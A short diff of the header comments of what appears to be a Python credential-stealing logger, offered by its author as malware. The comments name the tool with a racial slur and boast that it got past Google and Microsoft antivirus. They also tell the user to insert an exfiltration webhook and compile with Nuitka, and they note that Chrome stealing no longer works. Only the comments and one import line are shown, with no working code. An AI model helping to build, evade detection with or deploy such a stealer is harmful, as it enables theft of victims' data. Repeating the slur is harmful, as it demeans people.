@@ -1,11 +1,11 @@
 #well well nigger logger v3
-#well well this is pure art created with brain,love and ofc some ai (nobody can stop me from doing this)
+#well this is pure art created with brain,love and ofc some ai (nobody can stop me from doing this)
 #coded by dex/d3xoncpvp
 #for support add d3xonv3 on discord
 #selling this src or project is prohibited
 #might be UD might be NOT it bypassed google and microsoft av when tested and hit a virustotal score of 18/72
 #ye thats alot of yapping for a 500line project
-#alr imma stop yapping just put youre webhook in the shitty code below (line 88 to be exact) ye and compile with nukita bc pyinstaller sucks
+#alr imma stop yapping just put youre webhook in the shitty code below (line 88 to be exact) ye and compile with nuitka bc pyinstaller sucks
 #one last yapping chrome stealing doesnt work bc of new security features
 
 import os
